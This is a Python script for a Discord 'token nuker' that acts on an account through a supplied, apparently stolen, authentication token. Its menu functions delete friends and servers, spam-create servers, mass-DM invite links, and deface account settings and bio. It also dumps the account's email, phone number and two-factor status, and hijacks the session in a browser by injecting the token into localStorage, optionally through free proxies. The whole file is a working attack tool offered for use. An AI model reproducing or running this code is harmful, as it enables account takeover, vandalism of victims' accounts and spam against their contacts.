try:  
    from itertools import count
    import os
    import sys
    import fade
    import time
    import random
    import requests
    from time import sleep
    from colorama import Fore
    import fade
    import os, sys, ctypes, time
    from selenium import webdriver
    from selenium.webdriver.common.keys import Keys
    from colorama import Fore
    from fp.fp import FreeProxy
    from selenium import webdriver
    from selenium.webdriver.common.proxy import Proxy, ProxyType   
    from selenium import webdriver
    from selenium.webdriver.common.proxy import *
    from selenium.webdriver.firefox.options import Options
except Exception as e:
    print(f"{Fore.RED} cant load files. missing extentions. run install.bat before runnig the main code.  error: \n{e}{Fore.RESET}")
    time.sleep(5)
    os.system('exit')
sleep = time.sleep
red = {Fore.LIGHTRED_EX}
green = {Fore.LIGHTGREEN_EX}
blue = {Fore.LIGHTCYAN_EX}
magenta = {Fore.LIGHTMAGENTA_EX}
reset = {Fore.RESET}
icon = Fore.LIGHTMAGENTA_EX + "["+ Fore.LIGHTCYAN_EX + "<3" + Fore.MAGENTA + "]  " + Fore.RESET

bn = """

                      █    ██  ███▄    █  ██ ▄█▀ ███▄    █  ▒█████   █     █░███▄    █ 
                      ██  ▓██▒ ██ ▀█   █  ██▄█▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░██ ▀█   █ 
                     ▓██  ▒██░▓██  ▀█ ██▒▓███▄░ ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█▓██  ▀█ ██▒
                     ▓▓█  ░██░▓██▒  ▐▌██▒▓██ █▄ ▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█▓██▒  ▐▌██▒
                     ▒▒█████▓ ▒██░   ▓██░▒██▒ █▄▒██░   ▓██░░ ████▓▒░░░██▒██▓▒██░   ▓██░
                     ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ▒ ▒▒ ▓▒░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒ ░ ▒░   ▒ ▒ 
                     ░░▒░ ░ ░ ░ ░░   ░ ▒░░ ░▒ ▒░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░ ░ ░░   ░ ▒░
                      ░░░ ░ ░    ░   ░ ░ ░ ░░ ░    ░   ░ ░ ░ ░ ░ ▒    ░   ░    ░   ░ ░ 
                        ░              ░ ░  ░            ░     ░ ░      ░            ░ 
                                                                  

"""

banner = fade.fire(bn)


lol = """
                     ╔══════════════════════════════════════════════════════════════╗
                     ║ [1] Nuke Token                 [9]  Get All Friends          ║  
                     ║ [2] Leave Servers              [10] Token Info               ║
                     ║ [3] Delete Friends             [11] Token Checker            ║
                     ║ [4] Delete Servers             [12] Fuck Account             ║
                     ║ [5] Mass Dm                    [13] change hypesquad         ║
                     ║ [6] Close DMs                  [14] change bio               ║
                     ║ [7] Create Servers             [15] login token              ║
                     ║ [8] Block All Friends                                        ║
                     ║                                [16] credit                   ║
                     ║                                [17] exit                     ║
                     ║                                                              ║
                     ╚══════════════════════════════════════════════════════════════╝
"""
list = fade.purpleblue(lol)


heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]


def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers


def set_console_title(text:str):
    sys.stdout.write(f"\x1b]2;{text}\x07")

def checker(token:str):
    base_url = "https://discord.com/api/v9/users/@me"
    message = "You need to verify your account in order to perform this action."

    r = requests.get(base_url, headers=getheaders(token))
    if r.status_code != 200:
        print(f"\n{icon}Invalid Token.{Fore.RESET}")
        time.sleep(50)
        try:
           if ["message"] == message:
            print(f"\n{icon}Phone Locked Token!{Fore.RESET}")
            time.sleep(50)
        except:
            pass
    else:
         print(f"{icon} Token is valid")
         time.sleep(50)

def credit():
    print(banner)
    print("")
    lil = f"""
    Made by -

    discord : ! . unknown.ly#0001
    github : ishrak3232
    """
    credit = fade.pinkred("     "+lil)
    print(credit)

def close():
    os.system('exit')

def tokeninfo(token:str):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
[{Fore.LIGHTCYAN_EX}User ID{Fore.RESET}]         {userID}
[{Fore.LIGHTCYAN_EX}User Name{Fore.RESET}]       {userName}
[{Fore.LIGHTCYAN_EX}2 Factor{Fore.RESET}]        {mfa}
[{Fore.LIGHTCYAN_EX}Email{Fore.RESET}]           {email}
[{Fore.LIGHTCYAN_EX}Phone number{Fore.RESET}]    {phone if phone else "None"}
[{Fore.LIGHTCYAN_EX}Token{Fore.RESET}]           {token}
            ''')

def friends(token:str):
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    r = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    )
    print("\n")
    for friend in r.json():
        print(f"{Fore.WHITE}[ {Fore.LIGHTCYAN_EX}C {Fore.WHITE}] {friend['user']['username']}#{friend['user']['discriminator']}")


def block(token:str):
    headers = {"authorization": token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"{icon} Blocked Friend | {i['id']}")

def createServers(token:str, count:int, name:str):
    set_console_title("Unknown nuker")
    headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
    for i in range(int(count)):
        print(f"{icon}[{str(i+1)}] Created Server")
        json = { 'name': name }
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=json)
    time.sleep(2)


def close_all_dms(token:str):
    set_console_title("Unknown nuker")
    headers = {"authorization": token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get("https://canary.discord.com/api/v8/users/@me/channels", headers=headers).json()
    for channel in close_dm_request:
        print(f"{icon} {Fore.LIGHTCYAN_EX}ID: "+channel['id'] + Fore.RESET)
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,)


def massDM(token:str, content:str):
    headers = {'Authorization': token}
    channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
            headers=headers,
            data={"content": f"{content}"})
            print(f"{icon} {Fore.LIGHTCYAN_EX}ID: "+channel['id'] + Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")

def delete_servers(token:str):
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        for guild in guildsIds:
             try:
                 requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
                 print(f'{icon}Deleted: '+guild['name']+Fore.RESET)
             except Exception as e:
                 print(f"The following error has been encountered and is being ignored: {e}")

def delete_friends(token:str):
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
        for friend in friendIds:
             try:
               requests.delete(
               f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=getheaders(token))
               print(f"{icon}Removed Friend: "+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
             except Exception as e:
                print(f"The following error has been encountered and is being ignored: {e}")

def leave_servers(token:str):
        headers = {'Authorization': token}
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        for guild in guildsIds:
             try:
                requests.delete(
                f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], headers={'Authorization': token})
                print(f"{icon}Left Server: "+guild['name']+Fore.RESET)
             except Exception as e:
                  print(f"The following error has been encountered and is being ignored: {e}")


def hypeSquadChanger(token:str):
    hypetoken = token
    print(f"\n[1] Bravery\n[2] Briliance\n[3] Balance\n")
    hypesquad = input(f"Choice: {Fore.RESET}")
    headersosat = {
        'Authorization': str(hypetoken)
    }

    payloadsosat = {
        'house_id': str(hypesquad)
    }
    time.sleep(1)
    rep = requests.session().post("https://discord.com/api/v8/hypesquad/online", json=payloadsosat, headers=headersosat)


def fuckAccount(token:str):
        setting = {
            'theme': 'light',
            'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
            'custom_status':{
                'text': 'Fucked by Unknown.ly',
                'emoji_name': '🔥'
            },
            'render_embeds': False,
            'render_reactions': False
        }
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=getheaders(token), json=setting)
        print(f"{icon}Fucked his Account")
        time.sleep(2)


def bio(token:str, bio):
    requests.patch(url="https://discord.com/api/v9/users/@me", headers= {"authorization": token}, json = {"bio": bio} )
    print(f"{icon} changed bio to {bio}")

def wizz(token:str):
    print(f"{icon} fucking account....")
    fuckAccount(token=token)
    print(f"{icon}changing bio....")
    bio(token=token, bio="discord.gg/legittools discord.gg/legitmethods")
    print(f"mass dm.....")
    massDM(token=token, content="""@here bro I got usefull tools, tokens, nitro from 
    fucked by unknown.ly
    https://discord.gg/legittools 
    https://discord.gg/legitmethods""")
    print(f"{icon} leaving servers...")
    leave_servers(token=token)
    leave_servers(token=token)
    leave_servers(token=token)
    leave_servers(token=token)
    leave_servers(token=token)
    print(f"deleting servers...")
    delete_servers(token=token)
    delete_servers(token=token)
    delete_servers(token=token)
    delete_servers(token=token)
    print(f"{icon}clossing dms........")
    close_all_dms(token=token)
    close_all_dms(token=token)
    print(f"{icon}deleting friends...")
    delete_friends(token=token)
    delete_friends(token=token)
    print(f"{icon}creatting servers.....")
    createServers(token=token, count=100, name="unknown.ly fcked u")
    createServers(token=token, count=100, name="unknown.ly fcked u")
    createServers(token=token, count=100, name="unknown.ly fcked u")
    createServers(token=token, count=100, name="unknown.ly fcked u")
    os.system('cls')
    print(f"{icon} succesfully wizzed id [+]")

def tokenlogin(token):
    trey = """
    [1] use custom proxy
    [2] use generated proxy
    [3] none. use your proxy
    """
    yyyy = fade.fire(trey)
    print(yyyy+"\n")
    prox = input(" >> ")

    if prox == "3":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            driver = webdriver.Chrome('chromedriver.exe')
            driver.get('https://discord.com/login')
            js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
            time.sleep(3)
            driver.execute_script(js + f'login("{token}")')
            time.sleep(3.156e+7)
            os.system('cls')
            print("")
            print(f"{Fore.GREEN}[+] {Fore.WHITE}succesfully loged in")
            time.sleep(3.156e+7)

        except Exception as e:
            print(f'{Fore.RED}[-] {Fore.WHITE}Cant Login error: ')
            print(f'{e}')
            time.sleep(100)
    elif prox == "1":
        try:
             ewq = input("proxy >> ")
             myProxy = ewq
             proxy = Proxy({
             'proxyType': ProxyType.MANUAL,
             'httpProxy': myProxy,
             'sslProxy': myProxy,
             'noProxy': ''})

             options = Options()
             options.proxy = proxy
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
             driver = webdriver.Chrome('chromedriver.exe')
             driver.get('https://discord.com/login')
             js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
             time.sleep(3)
             driver.execute_script(js + f'login("{token}")')
             time.sleep(3.156e+7)
             os.system('cls')
             print("")
             print(f"{Fore.GREEN}[+] {Fore.WHITE}succesfully loged in")
             time.sleep(3.156e+7)
 
        except Exception as e:
            print(f'{Fore.RED}[-] {Fore.WHITE}Cant Login error: ')
            print(f'{e}')
            time.sleep(100)
    elif prox == "2":
        try:
             print(f"{Fore.LIGHTCYAN_EX} generating proxy........")
             pro = FreeProxy(rand=True).get()
             print(f"{Fore.BLUE} got proxy : {pro}")
             myProxy = pro
             proxy = Proxy({
             'proxyType': ProxyType.MANUAL,
             'httpProxy': myProxy,
             'sslProxy': myProxy,
             'noProxy': ''})

             options = Options()
             options.proxy = proxy
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
             driver = webdriver.Chrome('chromedriver.exe')
             driver.get('https://discord.com/login')
             js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
             time.sleep(3)
             driver.execute_script(js + f'login("{token}")')
             time.sleep(3.156e+7)
             os.system('cls')
             print("")
             print(f"{Fore.GREEN}[+] {Fore.WHITE}succesfully loged in")
             time.sleep(3.156e+7)
 
        except Exception as e:
            print(f'{Fore.RED}[-] {Fore.WHITE}Cant Login error: ')
            print(f'{e}')
            time.sleep(100)





if __name__ == '__main__':
    print("\n")
    print("\n")
    print("\n")
    print("\n")
    print("\n")
    for i in range(101):
         sys.stdout.write('\r')
         sys.stdout.write(f"{Fore.GREEN}        █%-10s█ %d%%{Fore.RESET}" % ('▒'*i, 1*i))
         sys.stdout.flush()
         sleep(0.02)
    os.system('cls')
    toki = input('token : ')
    os.system('cls')
    set_console_title(text="Unknown.ly nuker V1")
    print(banner)
    print(list)
    c = input("    >>   ")
    os.system('cls')
    if c == "1":
        wizz(token=toki)
    elif c == '2':
        leave_servers(token=toki)
    elif c == '3':
        delete_friends(token=toki)
    elif c == '4':
        delete_servers(token=toki)
    elif c == '5':
        content = input("content : ")
        massDM(token=toki, content=content)
    elif c == '6':
        close_all_dms(token=toki)
    elif c == '7':
        name = input('name : ')
        createServers(token=toki, count=100, name=name)
        createServers(token=toki, count=100, name=name)
        createServers(token=toki, count=100, name=name)
        createServers(token=toki, count=100, name=name)
    elif c == '8':
        block(token=toki)
    elif c == '9':
        friends(token=toki)
    elif c == '10':
        tokeninfo(token=toki)
    elif c == '11':
        checker(token=toki)
    elif c == "12":
        fuckAccount(token=toki)
    elif c == '13':
        hypeSquadChanger(token=toki)
    elif c == '14':
        bi = input("bio : ")
        bio(token=toki, bio=bi)
    elif c == '16':
        credit()
    elif c == '17':
        close()
    elif c == '15':
        tokenlogin(token=toki)
    else:
        print("{red}not a valid argument")
        sleep(10)
        close()